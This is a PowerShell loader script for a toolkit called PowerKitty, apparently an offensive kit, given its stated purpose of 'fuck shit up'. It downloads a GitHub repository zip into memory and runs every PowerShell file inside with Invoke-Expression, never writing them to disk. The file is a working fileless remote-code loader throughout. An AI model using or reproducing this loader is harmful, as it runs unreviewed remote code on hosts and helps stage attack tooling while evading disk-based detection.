<#
.SYNOPSIS
  
.DESCRIPTION
  
.PARAMETER 
  
.INPUTS
  
.OUTPUTS
  
.NOTES
  Author:         WillBambi
  Creation Date:  2022/02/24
  Purpose/Change: Fuck shit up, my way, on my time, with my preference of shell.
  
.EXAMPLE
  
#>

#---------------------------------------------------------[Initialisations]--------------------------------------------------------
$CurrentOS = [System.Environment]::OSVersion.Platform

#----------------------------------------------------------[Declarations]----------------------------------------------------------
# Location for WPS ZIP Master in gitgub
$MasterLocation = "https://github.com/WillChaos/PowerKitty/archive/refs/heads/master.zip"
    
#-----------------------------------------------------------[Functions]------------------------------------------------------------
Function Invoke-Banner
{
    # Simple banner
    Write-Host " 
    
          _____                         _  ___ _   _         
         |  __ \                       | |/ (_) | | |        
         | |__) |____      _____ _ __  | ' / _| |_| |_ _   _ 
         |  ___/ _ \ \ /\ / / _ \ '__| |  < | | __| __| | | |
         | |  | (_) \ V  V /  __/ |    | . \| | |_| |_| |_| |
         |_|   \___/ \_/\_/ \___|_|    |_|\_\_|\__|\__|\__, |
                                                        __/ |
                                                       |___/ 

    " -ForegroundColor Green

}

Function Configure-PreReqs
{
# Configure TLS support for github
    try
    {
        ([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12) | Out-Null
        Write-Host "[+] Configured TLS 1.2 Channels for Git communication" -ForegroundColor DarkMagenta

    }
    catch
    {
        Write-Host "[!] Failed to build TLS 1.2 Channel Support" -ForegroundColor DarkRed
    }
}

Function Invoke-Loader
{
  Write-Host "[+] Staging self in memory" -ForegroundColor DarkMagenta
  [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

  # download zip - store content as bytes (in mem)
  $ZipBytes   = (Invoke-WebRequest -Uri $MasterLocation).content
  
  # build a Zip object, and write the bytes into the zip object (in mem)
  $ZipStream  = New-Object System.IO.Memorystream
  $ZipStream.Write($ZipBytes,0,$ZipBytes.Length)
  $ZipArchive = New-Object System.IO.Compression.ZipArchive($ZipStream)
  $ZippedContent = $ZipArchive.Entries
  
  # opperate on each item in the zip
  foreach($Zippeditem in $ZippedContent)
  {
    # if the zip items contain a powershell file or module (that isnt the main module)
    if(($Zippeditem.FullName -like "*Ps1") -or ($Zippeditem.FullName -like "*psm1") -and ($Zippeditem.FullName -notlike "*PowerKitty.ps1"))
    {
        # open zip item type in memory - store string based contents into a file
        $EntryReader = New-Object System.IO.StreamReader($Zippeditem.Open())
        $ItemContent  = $EntryReader.ReadToEnd()

        # import into memory
        Write-Host "-[>] Importing module: "$Zippeditem.FullName  -ForegroundColor DarkGray
        Invoke-Expression $ItemContent
    }
  }
}

#-----------------------------------------------------------[Execution]------------------------------------------------------------

Invoke-Banner
Configure-PreReqs
Invoke-Loader
